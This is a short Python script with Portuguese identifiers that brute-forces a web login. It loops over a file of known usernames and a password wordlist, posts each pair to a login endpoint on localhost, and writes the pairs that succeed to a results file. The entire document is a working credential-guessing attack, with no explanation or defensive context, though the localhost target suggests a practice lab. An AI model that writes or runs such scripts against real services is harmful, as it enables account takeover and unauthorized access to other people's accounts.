import requests
import json


with open("usuarios_validos.txt", "r") as listausuarios:
    linhas = listausuarios.readlines()

    for linha in linhas:
    
        nome_usuario  = linha.strip()

        with open("wordlist/pass.txt", "r") as wordlist:
            passwords = wordlist.readlines()
            
            for password in passwords:
                senha = password.strip()    
                payload  = {'login': nome_usuario, 'senha': senha}
                r = requests.post('http://localhost:8080/usuario/login', json=payload)
                retorno = r.status_code
                if (retorno == 200):
                    with open("senhas_validas.txt", "a") as resultado:
                        resultado.write("\nUsuário: " + nome_usuario + "| Senha: "+senha)